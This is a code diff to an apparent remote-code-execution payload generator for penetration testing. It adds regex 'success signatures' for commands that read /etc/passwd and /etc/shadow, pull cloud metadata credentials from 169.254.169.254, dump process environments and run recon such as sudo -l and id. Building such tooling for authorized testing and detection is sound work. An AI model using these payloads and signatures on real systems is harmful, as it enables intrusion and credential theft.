@@ -4,6 +4,7 @@ import base64
 import json
 import logging
 import random
+import re
 import string
 import sys
 import urllib.parse
@@ -45,6 +46,7 @@ class PayloadRecord:
     stateful: bool = False
     token: Optional[str] = None
     oob_host: Optional[str] = None
+    match: Optional[str] = None
 
 class RCEPayloadGenerator:
     def __init__(
@@ -283,6 +285,40 @@ class RCEPayloadGenerator:
         }
         return category_indicators.get(category_name, f"Expect a controlled {env} execution observable in the response or logs.")
 
+    # Machine-readable success signatures: a regex that, if found in the target's
+    # response, confirms the payload executed. Each entry maps command markers in
+    # the payload to the regex that proves that command ran.
+    _COMMAND_SIGNATURES = [
+        (("/etc/passwd", "/etc/shadow", "awk -f:"), r"root:.*?:0:0:"),
+        (("uname",), r"(Linux|Darwin|GNU|BSD)\b"),
+        (("systeminfo", "cmd /c ver", " ver\n", "wmic os"), r"Microsoft Windows"),
+        (("ipconfig",), r"(IPv4|Windows IP Configuration)"),
+        (("ifconfig", "ip addr", "ip a\b", "ip -a"), r"(inet\s|ether\s|link/ether)"),
+        (("sudo -l",), r"(may run|NOPASSWD|not allowed to run sudo)"),
+        (("/etc/os-release", "lsb_release"), r"(PRETTY_NAME=|VERSION=|Distributor ID)"),
+        (("printenv", "\benv\b", "set \n"), r"\bPATH="),
+        (("7*7", "7 * 7"), r"(^|\D)49(\D|$)"),
+        (("whoami /priv", "whoami /groups"), r"(Privilege|GROUP|SID)"),
+        (("/proc/1/cgroup", "/proc/self/cgroup", "/proc/1/environ"), r"(cpuset|docker|kubepods|/init|HOSTNAME=)"),
+        (("169.254.169.254", "computemetadata", "security-credentials", "latest/meta-data", "100.100.100.200"),
+         r"(ami-|AccessKeyId|InstanceProfileArn|SecurityCredentials|\"Token\"|iam)"),
+        (("__schema", "__typename", "__type("), r"(__schema|queryType|__typename|\"data\"\s*:)"),
+        (("netstat", "ss -t", "ss -tunlp"), r"(LISTEN|ESTABLISHED|Proto)"),
+    ]
+
+    def _infer_command_match(self, payload: str, category_name: str) -> Optional[str]:
+        """Return a response regex that confirms this payload executed, if known."""
+        lower = payload.lower()
+        for markers, regex in self._COMMAND_SIGNATURES:
+            for marker in markers:
+                token = marker.strip("\\b")
+                if token and token.lower() in lower:
+                    return regex
+        # `id` / `id -u` produce a very recognisable uid=... line.
+        if re.search(r"(^|[^\w.])id(\b|['\")])", payload) or "id -u" in lower:
+            return r"uid=\d+"
+        return None
+
     def _is_blocking(self, payload: str) -> bool:
         lower_payload = payload.lower()
         return any(token in lower_payload for token in ["tail -f", "sleep ", "timeout /t", "start-sleep", "readline()", "while(($i ="])
@@ -463,6 +499,7 @@ class RCEPayloadGenerator:
                             blocking=blocking,
                             stateful=bool(base.get("stateful", self._is_stateful(payload))),
                             oob_domain=oob_domain,
+                            match_sig=base.get("match") or self._infer_command_match(payload, "detection"),
                         )
             return
 
@@ -562,6 +599,7 @@ class RCEPayloadGenerator:
 
         notes = tuple([*base.get("notes", ()), *self._lint_payload(payload, env)])
         tags = tuple(dict.fromkeys([*base.get("tags", ()), category_name, *( [sink] if sink else [] )]))
+        match_sig = base.get("match") or self._infer_command_match(payload, category_name)
         variants = [payload]
         # Shell-quoted break-out contexts already supply their own separator, so
         # prepending an env separator would produce ";;" style syntax errors.
@@ -589,6 +627,7 @@ class RCEPayloadGenerator:
                 blocking=blocking,
                 stateful=bool(base.get("stateful", self._is_stateful(payload))),
                 oob_domain=oob_domain,
+                match_sig=match_sig,
             )
 
     def _encode_record_variants(
@@ -610,6 +649,7 @@ class RCEPayloadGenerator:
         blocking: bool,
         stateful: bool,
         oob_domain: Optional[str] = None,
+        match_sig: Optional[str] = None,
     ) -> Iterator[PayloadRecord]:
         context = self.contexts[context_name]
         for enc_name in encodings:
@@ -647,6 +687,17 @@ class RCEPayloadGenerator:
                 if escape != "none":
                     final_notes.append(f"Payload is escaped for the '{context_name}' serialization context; the sink must decode it before execution.")
 
+                # Machine-readable success signature: a reflected canary token is
+                # the exact confirmation string; OOB/timing use their own oracle;
+                # otherwise fall back to the inferred command-output regex, which
+                # matches the response regardless of how the payload was encoded.
+                if exp_channel in {"interactsh", "timing"}:
+                    match = None
+                elif token is not None:
+                    match = re.escape(token)
+                else:
+                    match = match_sig
+
                 yield PayloadRecord(
                     payload=wrapped_payload,
                     mode=mode,
@@ -665,6 +716,7 @@ class RCEPayloadGenerator:
                     stateful=stateful,
                     token=token,
                     oob_host=oob_host,
+                    match=match,
                 )
             except Exception as exc:
                 logger.error("Error encoding payload with %s: %s", enc_name, exc)
@@ -742,7 +794,7 @@ class RCEPayloadGenerator:
                             file.write(record.payload + "\n")
                             if metadata_file:
                                 metadata_file.write(serialized + "\n")
-                        if record.token:
+                        if record.token or record.match:
                             manifest.append({
                                 "token": record.token,
                                 "oob_host": record.oob_host,
@@ -754,6 +806,7 @@ class RCEPayloadGenerator:
                                 "encoding": record.encoding,
                                 "expected_channel": record.expected_channel,
                                 "indicator": record.indicator,
+                                "match": record.match,
                             })
                         count += 1
                         if max_payloads and count >= max_payloads:
@@ -827,8 +880,6 @@ class RCEPayloadGenerator:
 
     def _write_nuclei(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int]) -> int:
         """Emit Nuclei templates grouped by environment and oracle (OOB / time-based / reflection)."""
-        import re
-
         outdir = self._format_outdir(output_path, "nuclei")
         outdir.mkdir(parents=True, exist_ok=True)
         canary = "RCEPGCANARY"
